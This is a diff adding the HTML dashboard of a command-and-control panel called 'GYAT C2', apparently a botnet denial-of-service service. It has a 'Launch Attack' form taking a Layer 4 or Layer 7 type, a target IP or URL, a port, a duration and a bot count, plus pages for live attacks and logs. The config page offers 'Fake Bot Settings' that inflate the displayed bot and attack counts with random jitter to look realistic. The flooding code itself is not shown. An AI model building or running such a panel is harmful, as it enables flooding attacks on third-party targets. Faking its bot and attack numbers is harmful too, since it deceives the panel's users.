@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GYAT C2 - Dashboard</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="assets/attack-popup.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <script src="assets/attack-popup.js"></script>
+    <div class="dashboard">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2>GYAT C2</h2>
+                <p>Control Panel</p>
+            </div>
+            <div class="sidebar-menu">
+                <a href="#" class="menu-item active" data-page="dashboard">
+                    <i class="fas fa-tachometer-alt"></i>
+                    <span>Dashboard</span>
+                </a>
+                <a href="#" class="menu-item" data-page="attack">
+                    <i class="fas fa-bolt"></i>
+                    <span>Attack</span>
+                </a>
+                <a href="#" class="menu-item" data-page="logs">
+                    <i class="fas fa-list"></i>
+                    <span>Logs</span>
+                </a>
+                <a href="#" class="menu-item" data-page="config">
+                    <i class="fas fa-cog"></i>
+                    <span>Config</span>
+                </a>
+                <a href="#" class="menu-item" id="logout-btn">
+                    <i class="fas fa-sign-out-alt"></i>
+                    <span>Logout</span>
+                </a>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <div id="safe-mode-banner" class="safe-mode-banner">
+                You are on SAFE MODE | Your attacks are not gonna work
+            </div>
+            
+            <!-- Dashboard Page -->
+            <div class="content-page" id="dashboard-page">
+                <div class="dashboard-header">
+                    <div class="dashboard-title">
+                        <h1>Dashboard</h1>
+                    </div>
+                </div>
+                
+                <div class="stats-container">
+                    <div class="stat-card">
+                        <h3>Connected Bots</h3>
+                        <div class="stat-value" id="bot-count">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Active Attacks</h3>
+                        <div class="stat-value" id="attack-count">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Server Status</h3>
+                        <div class="stat-value" id="server-status">Online</div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Active Attacks</h2>
+                    </div>
+                    <table class="attack-list">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Type</th>
+                                <th>Target</th>
+                                <th>Duration</th>
+                                <th>Progress</th>
+                                <th>Status</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="active-attacks-list">
+                            <!-- Attack list will be populated by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <!-- Attack Page -->
+            <div class="content-page" id="attack-page" style="display: none;">
+                <div class="dashboard-header">
+                    <div class="dashboard-title">
+                        <h1>Launch Attack</h1>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Attack Settings</h2>
+                    </div>
+                    <div class="attack-form">
+                        <div class="form-group">
+                            <label for="attack-type">Attack Type</label>
+                            <select id="attack-type">
+                                <option value="L4">Layer 4 (TCP)</option>
+                                <option value="L7">Layer 7 (RAW)</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="attack-target">Target</label>
+                            <input type="text" id="attack-target" placeholder="IP or URL">
+                        </div>
+                        <div class="form-group" id="port-group">
+                            <label for="attack-port">Port</label>
+                            <input type="number" id="attack-port" placeholder="Port" value="80">
+                        </div>
+                        <div class="form-group">
+                            <label for="attack-duration">Duration (seconds)</label>
+                            <input type="number" id="attack-duration" placeholder="Duration" value="60" min="1" max="300">
+                        </div>
+                        <div class="form-group">
+                            <label for="attack-concurrency">Concurrency (bots)</label>
+                            <input type="number" id="attack-concurrency" placeholder="Concurrency" value="1" min="1" max="10">
+                        </div>
+                    </div>
+                    <div class="attack-actions">
+                        <button id="start-attack-btn" class="btn btn-primary">Start Attack</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Logs Page -->
+            <div class="content-page" id="logs-page" style="display: none;">
+                <div class="dashboard-header">
+                    <div class="dashboard-title">
+                        <h1>Server Logs</h1>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Terminal</h2>
+                    </div>
+                    <div class="terminal" id="terminal">
+                        <!-- Terminal logs will be populated by JavaScript -->
+                        <div class="terminal-line terminal-info">[System] GYAT C2 Terminal initialized</div>
+                        <div class="terminal-line terminal-success">[System] Connected to server</div>
+                        <div class="terminal-line">[System] Waiting for logs...</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Config Page -->
+            <div class="content-page" id="config-page" style="display: none;">
+                <div class="dashboard-header">
+                    <div class="dashboard-title">
+                        <h1>Configuration</h1>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h2>System Settings</h2>
+                    </div>
+                    <div class="config-form">
+                        <div class="form-group">
+                            <div class="toggle-container">
+                                <label class="switch">
+                                    <input type="checkbox" id="demo-mode-toggle" checked>
+                                    <span class="slider"></span>
+                                </label>
+                                <span class="toggle-label">Demo Mode (Safe Mode)</span>
+                            </div>
+                            <p class="form-help">When enabled, attacks will be simulated and no actual traffic will be sent.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h2>Fake Bot Settings</h2>
+                    </div>
+                    <div class="config-form">
+                        <div class="form-group">
+                            <label for="fake-bots">Minimum Fake Bots</label>
+                            <input type="number" id="fake-bots" placeholder="Fake Bots" value="8" min="0" max="100">
+                            <p class="form-help">Minimum number of fake bots to display. Real bots will be added to this number.</p>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="fake-attacks">Minimum Fake Attacks</label>
+                            <input type="number" id="fake-attacks" placeholder="Fake Attacks" value="121" min="0" max="1000">
+                            <p class="form-help">Minimum number of fake attacks to display.</p>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="fake-attacks-random">Random Range for Fake Attacks</label>
+                            <input type="number" id="fake-attacks-random" placeholder="Random Range" value="2" min="0" max="10">
+                            <p class="form-help">Random range to add/subtract from fake attacks count for more realistic display.</p>
+                        </div>
+                        
+                        <div class="attack-actions">
+                            <button id="save-config-btn" class="btn btn-primary">Save Configuration</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
